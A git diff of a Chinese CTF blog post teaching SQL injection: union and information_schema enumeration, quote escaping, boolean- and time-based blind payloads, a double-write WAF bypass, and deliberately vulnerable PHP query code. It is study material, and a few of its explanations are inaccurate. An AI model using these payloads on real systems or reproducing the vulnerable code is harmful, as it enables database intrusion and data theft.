@@ -2,7 +2,7 @@
 title: SQL注入
 date: 2025-11-15 20:53:26
 tags:
-index_img: https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png
+index_img: https://gitee.com/bobrocket/img/raw/master/img/69189f3e3203f7be000915ab.png
 categories: CTF
 ---
 
@@ -214,63 +214,157 @@ python sqlmap.py -u "http://ctf.example.com/web5/?id=1" --tamper=gbkencode --dbs
 
 ## 三、SQL语法
 
-在 SQL 中，`SHOW COLUMNS FROM flag` 语句用于显示名为 `flag` 的表中各列的详细信息。它返回的结果通常是一个结果集，每行代表表中的一列，各列提供了关于该列的不同元数据信息。常见的格式如下：
+`show tables`查询所有表，可以看到flag表
 
-**列名**：显示各列信息的标题。通常包含以下常见列：
+`show columns from flag`查询flag表的所有字段
 
-- **Field**：列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 `username`。
-- **Type**：列的数据类型。表明该列可以存储的数据类型，如 `INT`（整数类型）、`VARCHAR(255)`（可变长度字符串，最大长度为 255）、`DATE`（日期类型）等。
-- **Null**：表示该列是否允许存储 `NULL` 值。如果显示 `YES`，则该列可以接受 `NULL`；如果显示 `NO`，则不允许。
-- **Key**：显示该列是否被定义为键（如主键 `PRI`、唯一键 `UNI` 等）。如果是主键列，这里会显示 `PRI`。
-- **Default**：列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 `0`，则会在此处显示 `0`。如果没有设置默认值，可能显示为 `NULL` 或空白（具体取决于数据库系统）。
-- **Extra**：提供关于该列的额外信息。例如，对于自增长列，这里可能显示 `auto_increment`。
+| 列名    |                                                              |
+| :------ | ------------------------------------------------------------ |
+| Field   | 列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 `username` |
+| Type    | 列的数据类型。表明该列可以存储的数据类型，如 `INT`（整数类型）、`VARCHAR(255)`（可变长度字符串，最大长度为 255）、`DATE`（日期类型）等 |
+| Null    | 表示该列是否允许存储 `NULL` 值。如果显示 `YES`，则该列可以接受 `NULL`；如果显示 `NO`，则不允 |
+| Key     | 显示该列是否被定义为键（如主键 `PRI`、唯一键 `UNI` 等）。如果是主键列，这里会显示 `PRI` |
+| Default | 列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 `0`，则会在此处显示 `0`。如果没有设置默认值，可能显示为 `NULL` 或空白 |
+| Extra   | 提供关于该列的额外信息。例如，对于自增长列，这里可能显示 `auto_increment` |
+
+union可以将两个select语句的结果合并到一个结果集中，但要求两个select语句有相同的列数
+
+拼接后的语句：`select username from users where id=0 union select password from users`
+
+`order by` 关键字用于对结果集按照一个列或者多个列进行排序，我们可以利用二分法联合查询字段数
+
+SELECT 语句用于从数据库中选取数据
+
+`SELECT column1, column2, ... FROM table_name;` 
+
+WHERE 子句用于提取那些满足指定条件的记录
+
+`SELECT column1, column2, ... FROM table_name WHERE condition;` 
+
+LIMIT 子句用于控制查询的列
+
+`SELECT column1, column2, ... FROM table_name LIMIT 3;`  返回前 3 行数据
+
+`select database()`可以用来获取当前数据库的名字
+
+使用`union select`语句，结合`information_schema`系统表，获取表名和列名
+
+`select  group_concat(table_name) from information_schema.tables where table_schema=database()`
+
+查询字段 `select group_concat(column_name) from information_schema.columns where table_name='flag'`
+
+查询值 `select 1,group_concat(flag) from sqli.flag`
+
+#### 过滤
+
+[Sql注入绕过速查表 - 白阁文库](https://baizesec.github.io/bylibrary/速查表/sql注入绕过速查表/)
+
+#### 双写绕过
+
+SQL 注入中双写绕过的目标是对抗**WAF / 过滤规则对关键词（如`select`）的删除 / 替换**：过滤规则通常会匹配并删除字符串中的`select`，因此构造逻辑是：
+
+把`select`拆分为「前缀 + 后缀」（且`前缀+后缀=select`），再在中间插入完整的`select`，形成「前缀 + select + 后缀」。当 WAF 删除中间的`select`后，剩余的「前缀 + 后缀」会重新拼接成完整的`select`
+
+> 双写绕过的经典逻辑是「等长拆分关键词」（如`union`拆`uni+union+on`、`insert`拆`ins+insert+ert`），`select`拆 3+3 是行业通用写法，而`se+select+lect`是错误的拆分思路，既不通用，也易因过滤规则的微小差异失效。
 
 
 
-#### 过滤空格
+## 四、简单的SQL注入
 
-用`/**/` 代替
+### 数字型注入
 
+#### 1. 核心特征
 
+- 注入参数直接拼接在SQL语句中，**未被引号包裹**。
 
-## 四、手工注入
+- 示例测试：输入 `id=2-1` 仍能查出数据（本质执行 `id=1` 的查询逻辑）。
 
-[这可能是最全的SQL注入总结，不来看看吗](https://cloud.tencent.com/developer/article/1539207)
+#### 2. 关键语法与用法
 
-#### 整数型注入
+- **union 联合查询**：可将两个 `select` 语句的结果合并，要求两语句**列数相同**。
 
-[整数型SQL注入](https://blog.csdn.net/qq_69100706/article/details/140707246)
+- 拼接后示例语句：
 
-[SQL注入——整数型注入、报错注入](https://blog.51cto.com/m0re/3867378)
+    ```SQL
+    select username from users where id=0 union select password from users
+    ```
 
-#### 时间盲注
+- **limit 关键字**：用于控制查询结果的返回条数（限制列数/行数）。
 
-##### string 模块的常用常量
+### 字符型注入
 
-| 常量名                   | 含义                               | 示例值                                               |
-| ------------------------ | ---------------------------------- | ---------------------------------------------------- |
-| `string.ascii_lowercase` | 26 个小写英文字母                  | abcdefghijklmnopqrstuvwxyz                           |
-| `string.ascii_uppercase` | 所有大写英文字母                   | ABCDEFGHIJKLMNOPQRSTUVWXYZ                           |
-| `string.digits`          | 所有数字                           | 0123456789                                           |
-| `string.ascii_letters`   | 所有大小写英文字母（结合上面两个） | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ |
-| `string.punctuation`     | 所有标点符号                       | !"#$%&'()*+,-./:;<=>?@[]^_`{}~                       |
+#### 1. 核心特征
 
-**获取数据库长度**
+- 注入参数被引号（单引号/双引号）包裹，需先**逃逸引号**才能注入。
 
-> ?id=1 and if(length(database())=4,sleep(5),1) --+
+- 示例PHP代码（存在注入漏洞）：
 
-**获取数据库名**
+    ```PHP
+    $conn=mysqli_connect('127.0.0.1','root','root','test');
+    $res=mysqli_query($conn,"select id from users where username='".$_GET['username']."'");
+    $row=mysqli_fetch_array($res);
+    var_dump($row['id']);
+    ```
 
-> ?id=1 and if(substr(database(),1,1)='s',sleep(5),1) --+
+#### 2. 注入思路与步骤
 
-**获取表名**
+1. **闭合引号**：输入单引号 `'` 打破原SQL语句的引号平衡。
 
-> ?id=1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',sleep(5),1)--+
+2. **构造条件**：使用 `or` 拼接恒真条件（如 `1=1`），使查询返回所有结果。
 
-**获取列名**
+3. **注释后续**：用 `#` 注释掉原语句中多余的引号和代码（避免语法错误）。
 
-> ?id=1 and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sqli'),1,1)='a',sleep(5),1)--+
+#### 3. 示例操作
 
-**获取数据**
+- 注入输入（需URL编码）：`username='or1=1#`
 
-> ?id=1 and if(substr((select group_concat(flag) from flag),1,1)='a',sleep(5),1)--+
+    - URL编码后：`username=%27or%201=1%23`
+
+- 实际执行的SQL语句：
+
+    ```SQL
+    select id from users where username=''or 1=1 #
+    ```
+
+- 逻辑说明：`or` 连接两个表达式，第一个表达式（`''` 匹配）为假，第二个（`1=1`）为真，最终返回所有用户的id（示例中仅1条数据，返回id=1）。
+
+### 布尔盲注
+
+#### 1. 核心特征
+
+- 不直接返回查询结果，仅通过页面反馈（如“user exist”/“user not exist”）判断查询是否成功。
+
+- 示例PHP代码（布尔盲注场景）：
+
+    ```PHP
+    $conn=mysqli_connect('127.0.0.1','root','root','test');
+    $res=mysqli_query($conn,"select id from users where username='".$_GET['username']."'");
+    $count=mysqli_num_rows($res);
+    if($count>0){
+        echo "user exist";
+    }else{
+        echo "user not exist";
+    }
+    ```
+
+#### 2. 注入思路：逐字符猜解
+
+- 利用字符串截取函数（如 `substr`），逐位验证目标字段（如密码）的字符。
+
+#### 3. 关键函数：substr
+
+- 语法：`substr(字符串, 起始位置, 截取长度)`
+
+- 示例：`substr(password,1,1)` 表示截取 `password` 字段的第1个字符（起始位置从1开始）。
+
+#### 4. 示例操作
+
+- 猜解密码第1个字符：注入输入（URL编码）：`username=%27or%20substr(password,1,1)=%271%27%23`
+
+- 实际执行的SQL语句：
+
+    ```SQL
+    select id from users where username=''or substr(password,1,1)='1'#
+    ```
+
+- 逻辑说明：若密码第1个字符是 `1`，页面返回“user exist”；否则返回“user not exist”（示例中密码第1个字符为 `3`，故返回“user not exist”）。
